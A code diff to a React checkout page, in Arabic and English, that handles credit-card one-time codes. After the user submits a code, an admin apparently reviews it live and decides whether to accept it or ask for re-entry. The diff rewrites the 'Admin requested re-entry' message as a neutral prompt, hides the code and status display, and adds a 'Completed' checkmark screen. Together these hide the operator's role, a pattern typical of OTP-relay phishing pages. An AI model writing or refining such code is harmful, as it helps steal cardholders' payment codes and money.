@@ -92,7 +92,6 @@ export default function BuyPage() {
   const [verifyingOtp, setVerifyingOtp] = useState(false);
 
   const [ccSubmissionId, setCcSubmissionId] = useState('');
-  const [ccDecision, setCcDecision] = useState('pending');
 
   useEffect(() => {
     document.documentElement.dir = isRtl ? 'rtl' : 'ltr';
@@ -313,7 +312,6 @@ export default function BuyPage() {
       const resp = await submitCreditCardOtp(orderId, code);
       if (!resp?.submissionId) throw new Error('Missing submissionId');
       setCcSubmissionId(resp.submissionId);
-      setCcDecision('pending');
       setStage(4);
     } catch (e) {
       if (e?.code === 'OTP_NOT_FOUND_OR_EXPIRED') {
@@ -335,11 +333,13 @@ export default function BuyPage() {
         const r = await fetchCreditCardOtpDecision(ccSubmissionId);
         if (!alive) return;
         const decision = String(r?.decision || 'pending');
-        setCcDecision(decision);
         if (!decision || decision === 'pending') return;
 
         if (decision === 'completed') {
-          setSent(true);
+          setStage(5);
+          setTimeout(() => {
+            if (alive) setSent(true);
+          }, 1100);
           return;
         }
 
@@ -353,8 +353,8 @@ export default function BuyPage() {
         if (decision === 'reenter') {
           setError(
             isRtl
-              ? 'طلب الإدمن إعادة إدخال الرمز الصحيح. أدخل الكود الجديد.'
-              : 'Admin requested re-entry of the correct code. Enter the new code.'
+              ? 'من فضلك قم بإدخال الرمز الصحيح.'
+              : 'Please enter the correct code.'
           );
           setStage(3);
           setOtpCode('');
@@ -963,22 +963,20 @@ export default function BuyPage() {
                 <div className="cc-otp-await buy-span-2">
                   <div className="cc-otp-spinner" aria-hidden="true" />
                   <div className="cc-otp-await-title">{isRtl ? 'جار المعالجة' : 'Processing'}</div>
-                  <div className="cc-otp-await-code">
-                    {otpCode ? (
-                      <span>
-                        {isRtl ? 'الكود:' : 'Code:'} <code>{otpCode}</code>
-                      </span>
-                    ) : (
-                      <span style={{ opacity: 0.7 }}>{isRtl ? '—' : '—'}</span>
-                    )}
+                  <div className="cc-otp-await-sub">{isRtl ? 'يرجى الانتظار...' : 'Please wait...'}</div>
+                </div>
+              </div>
+            )}
+
+            {stage === 5 && (
+              <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
+                <div className="cc-otp-await cc-otp-complete buy-span-2">
+                  <div className="cc-otp-checkmark" aria-hidden="true">
+                    <svg viewBox="0 0 24 24" width="28" height="28">
+                      <path d="M20 7L9 18l-5-5" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round" />
+                    </svg>
                   </div>
-                  {ccDecision && ccDecision !== 'pending' && (
-                    <div className="cc-otp-await-sub">
-                      {isRtl
-                        ? `الحالة: ${ccDecision}`
-                        : `Status: ${ccDecision}`}
-                    </div>
-                  )}
+                  <div className="cc-otp-await-title">{isRtl ? 'تم الاكتمال' : 'Completed'}</div>
                 </div>
               </div>
             )}
@@ -1028,7 +1026,7 @@ export default function BuyPage() {
                           : 0.6,
                 }}
                 disabled={
-                  stage === 4
+                  stage === 4 || stage === 5
                     ? true
                     : stage === 1
                       ? !canMoveToPayDetails
